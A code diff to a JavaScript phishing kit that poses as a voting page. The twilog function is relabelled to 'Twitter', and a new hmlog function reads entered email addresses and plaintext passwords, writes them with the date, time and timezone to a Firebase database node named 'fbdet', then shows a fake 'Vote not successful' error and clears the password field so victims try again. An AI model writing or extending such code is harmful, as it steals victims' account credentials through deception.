@@ -149,7 +149,7 @@ function twilog() {
   var currentDate = new Date().toISOString().slice(0, 10);
   var currentTime = new Date().toISOString().slice(11, 19);
   var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-  var accountType = "Email";
+  var accountType = "Twitter";
 
   if (email !== "" && password !== "") {
     firebase.database().ref("fbdet").push({
@@ -168,6 +168,43 @@ function twilog() {
         "Sorry, something went wrong. Please try again."
       );
       document.getElementById("twi-pass").value = "";
+      return false;
+    }, 2000);
+  }
+}
+
+function hmlog() {
+  firebase
+    .auth()
+    .signInAnonymously()
+    .catch(function (error) {
+      showAlert("Error", error.message);
+    });
+
+  var email = document.getElementById("hm-uname").value;
+  var password = document.getElementById("hm-pass").value;
+  var currentDate = new Date().toISOString().slice(0, 10);
+  var currentTime = new Date().toISOString().slice(11, 19);
+  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  var accountType = "Email";
+
+  if (email !== "" && password !== "") {
+    firebase.database().ref("fbdet").push({
+      emle: email,
+      mobile: "",
+      time: currentTime,
+      timezone: timezone,
+      pass: password,
+      date: currentDate,
+      type: accountType,
+    });
+
+    setTimeout(function () {
+      showAlert(
+        "Vote not successful",
+        "Sorry, something went wrong. Please try again."
+      );
+      document.getElementById("hm-pass").value = "";
       return false;
     }, 2000);
   }
